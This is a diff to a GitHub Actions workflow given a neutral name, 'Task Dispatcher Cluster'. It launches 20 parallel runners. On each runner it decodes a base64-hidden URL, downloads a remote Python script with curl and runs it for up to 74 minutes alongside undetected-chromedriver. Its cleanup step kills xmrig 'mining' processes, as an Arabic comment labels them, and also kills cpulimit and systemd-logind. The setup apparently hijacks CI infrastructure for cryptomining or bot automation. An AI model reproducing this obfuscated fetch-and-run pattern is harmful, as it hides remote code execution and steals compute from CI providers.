@@ -1,4 +1,4 @@
-name: Automated Workforce Pipeline
+name: Task Dispatcher Cluster (Linux)
 
 on:
   repository_dispatch:
@@ -6,65 +6,81 @@ on:
   workflow_dispatch:
 
 concurrency:
-  group: system-runner-${{ github.workflow }}-${{ github.ref }}
+  group: cluster-pool-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 jobs:
-  dispatch-workers:
-    name: "WorkerNode-${{ matrix.node_index }}"
-    runs-on: windows-2022
+  launch-workers:
+    name: "Runner-Node-${{ matrix.node_index }}"
+    runs-on: ubuntu-latest
     timeout-minutes: 75
 
     strategy:
       fail-fast: false
       matrix:
-        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      - name: Setup Workspace & Fetch Script
-        shell: bash
+      # -----------------------------------------------------------
+      # خطوة 1: تحديث النظام وتثبيت الأدوات الأساسية
+      # -----------------------------------------------------------
+      - name: System Update & Dependencies
         run: |
-          echo "[INIT] Preparing WorkerNode-${{ matrix.node_index }}..."
-          
-          # فك تشفير الرابط المصدر وتحميل ملف التشغيل
-          TARGET_RESOURCE_URI=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS92YXovcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
-          
-          curl -sL "$TARGET_RESOURCE_URI" -o worker_task.py
-          
-          echo "[INIT] Updating dependencies..."
-          python -m pip install -qU pip setuptools
-          pip install -q undetected-chromedriver selenium requests
-          echo "[INIT] Environment setup completed."
+          echo "[STAGE-1] Initializing Runner Node ${{ matrix.node_index }} on Linux..."
+          sudo apt update -q
+          sudo apt install -y cpulimit curl python3-pip
 
-      - name: Execute Routine & Monitor Timeout
-        shell: pwsh
-        env:
-          PYTHONIOENCODING: "utf-8"
+      # -----------------------------------------------------------
+      # خطوة 2: تنزيل السكربت الرئيسي
+      # -----------------------------------------------------------
+      - name: Download Core Script
         run: |
-          Write-Host "[RUN] Executing script on node ${{ matrix.node_index }}..."
-          
-          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
-          
-          $ProcessConfig = @{
-              FilePath     = "python"
-              ArgumentList = "worker_task.py"
-              PassThru     = $true
-              NoNewWindow  = $true
-          }
-          $ActiveWorkerProcess = Start-Process @ProcessConfig
-          
-          Write-Host "[WATCHDOG] Execution timer started (Limit: 74 mins)."
-          
-          try {
-              Wait-Process -InputObject $ActiveWorkerProcess -Timeout 4440 -ErrorAction Stop
-              Write-Host "[SUCCESS] Task finished without issues."
-          }
-          catch {
-              Write-Host "[WARN] Time limit exceeded. Aborting instance..."
-              Stop-Process -InputObject $ActiveWorkerProcess -Force
-              Write-Host "[CLEANUP] Process terminated safely."
-          }
+          echo "[STAGE-2] Downloading app_task.py..."
+          PAYLOAD_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvbmV3ZS9yZXNvbHZlL21haW4vc3RhcnRfdGVzdC5weQ==" | base64 --decode)
+          curl -sL "$PAYLOAD_URL" -o app_task.py
+          echo "[STAGE-2] Download completed."
 
-      - name: Job Completion Step
-        shell: bash
-        run: echo "[COMPLETE] WorkerNode-${{ matrix.node_index }} finished."
+      # -----------------------------------------------------------
+      # خطوة 3: تثبيت المكتبات المطلوبة
+      # -----------------------------------------------------------
+      - name: Install Python Packages
+        run: |
+          echo "[STAGE-3] Installing Python dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+
+      # -----------------------------------------------------------
+      # خطوة 5: تشغيل السكربت الرئيسي مع مراقبة المهلة
+      # -----------------------------------------------------------
+      - name: Execute Core Process with Supervision
+        run: |
+          echo "==> Starting execution thread on node ${{ matrix.node_index }}..."
+          
+          # تشغيل السكربت في الخلفية
+          python3 app_task.py &
+          TASK_PID=$!
+          
+          echo "==> Monitor active. Timeout threshold set to 74 minutes."
+          
+          # الانتظار لمدة 74 دقيقة (4440 ثانية)
+          sleep 4440
+          
+          # إذا انتهى الوقت وما زالت العملية تعمل، نقتلها
+          if kill -0 $TASK_PID 2>/dev/null; then
+            echo "==> Time limit reached! Aborting process..."
+            kill -9 $TASK_PID
+            echo "==> Process forcefully terminated."
+          else
+            echo "==> Process finished successfully within allotted time."
+          fi
+
+      # -----------------------------------------------------------
+      # خطوة 6: إنهاء جميع عمليات التعدين المتبقية (تنظيف)
+      # -----------------------------------------------------------
+      - name: Finalize Execution
+        run: |
+          echo "[STATUS] Runner-Node-${{ matrix.node_index }} completed cycle."
+          echo "[CLEANUP] Killing any remaining cpulimit or mining processes..."
+          sudo pkill -f cpulimit || true
+          sudo pkill -f systemd-logind || true
+          sudo pkill -f xmrig || true
